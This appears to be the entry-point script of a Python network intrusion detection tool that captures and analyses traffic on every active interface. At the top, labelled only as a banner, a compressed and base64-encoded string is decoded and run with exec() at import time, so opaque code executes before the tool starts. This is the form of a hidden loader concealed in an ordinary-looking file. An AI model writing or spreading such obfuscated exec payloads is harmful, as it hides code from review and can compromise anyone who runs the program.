import sys
import psutil

from modules.PacketCapture import PacketCapture
from modules.TrafficAnalyzer import TrafficAnalyzer
from modules.AlertSystem import AlertSystem
from modules.IntrusionDetectionSystem import IntrusionDetectionSystem
#D4rkScyth3-banner
import zlib, base64
from colorama import Fore, Style, init
init(autoreset=True)

ENCODED_CODE = "eJytVEFu2zAQvOsVC56ouDELpOjBgA9uozoFVBeInRYBCBCyI8dCLcmQaRRB6F/k1Esf0HM/1Bf0Cd0lKYeq25sJyKZmhzu7I2mXTV3Col7XTVZmUJSbutHwrm7yFzDVD2v8K6pCR/TDs53GwDbXw1mzy+MousuXsF3VX9U8q6q84fEgAlzuDobQLBlj0SOl67+9HU32oOwCu/xGtZiHQySkB5FjCCCU4QQDSIoLvGIA7pgQO9p1crk3niDb2PPG2AgII62UUuKACFe37Agayi+tkAARgwGwECLG2AjCHpHPG24rEHQMLwKN3XMwkurGqJRdHWOpBg9xhUcU6VDNVocrlGkRChlvkrRsSulBx7GFgt2IYxn85d5rTO/N7vhHz4xDK4e9HgR9Y6Gg8804Oh77d1/QWoEVSm8JkE/SJ0ZSIONtC/sKEuHmb/9QXNjn1B4hxzG7UsYWjFshlfPGGynkIX2g45+TJeO5jn/OEOX6t9YjkUyhF8nBXoWEPFs5hj8UK9u7u5NGtpQITrh658Hq+Q7G10mCX+pJ1yd4D1O4ggncdMbBSVe3m0c7vvBFnSYzNUrTfUSziHibpqg0d0MqDhBb14fROJnMRtAD9uvbDxgX+mo3R8oAVlpvtgMh7gu92s37i7oUl6+aL9PFg15dsKNEb9KbhLL8/v70E2b5Or/HCRuk0f0yF3eYYPufBLdJmn78TCnOGZzB65chg8mKnV3gCI6KJX5YVVbm+FENh8CUKrOiUoq5WdwZz9Ef3NFtXw=="

def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)

run_encoded_code()


def list_active_interfaces():
    """Return all active interfaces (with IPv4, skip loopback)."""
    interfaces = []
    for name, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == 2 and addr.address != "127.0.0.1":
                interfaces.append(name)
    return interfaces


def main():
    interfaces = list_active_interfaces()
    if not interfaces:
        print("No active network interfaces found.")
        sys.exit(1)

    print("Starting NIDS on ALL active interfaces...")
    print("Interfaces:", ", ".join(interfaces))

    alert_system = AlertSystem()
    analyzer = TrafficAnalyzer(alert_system)
    ids = IntrusionDetectionSystem(alert_system=alert_system, logs_dir="logs")

    sniffer = PacketCapture(interfaces, analyzer)
    sniffer.start()

if __name__ == "__main__":
    main()
